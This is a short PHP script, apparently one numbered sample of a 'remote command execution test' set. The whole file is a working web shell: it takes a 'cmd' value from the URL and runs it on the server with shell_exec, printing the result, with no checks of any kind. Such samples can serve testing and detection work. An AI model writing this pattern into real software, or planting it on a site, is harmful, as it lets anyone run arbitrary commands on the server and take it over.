<?php
// RCE test variation #678
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>